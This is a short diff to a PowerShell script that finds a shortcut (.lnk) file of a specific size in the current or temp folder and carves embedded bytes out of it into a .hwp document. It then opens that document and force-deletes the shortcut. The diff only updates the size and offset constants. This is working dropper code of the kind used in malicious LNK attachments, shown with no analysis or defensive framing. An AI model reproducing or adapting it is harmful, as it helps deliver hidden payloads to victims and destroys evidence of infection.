@@ -1,7 +1,7 @@
-$lk=ls -Path '.\' | Where {$_.length -eq 87629};
-if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 87629}};
+$lk=ls -Path '.\' | Where {$_.length -eq 51277};
+if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2 | Where {$_.length -eq 51277}};
 if($lk -ne $null ){$oP=$lk.fullname.Replace('.lnk','.hwp');
-$file = [System.IO.File]::ReadAllBytes($lk.fullname);$file1=[byte[]]$file[5709..87628];
+$file = [System.IO.File]::ReadAllBytes($lk.fullname);$file1=[byte[]]$file[5709..51276];
 [System.IO.File]::WriteAllBytes($op,$file1);&$op;del $lk.fullname -force}
 
 
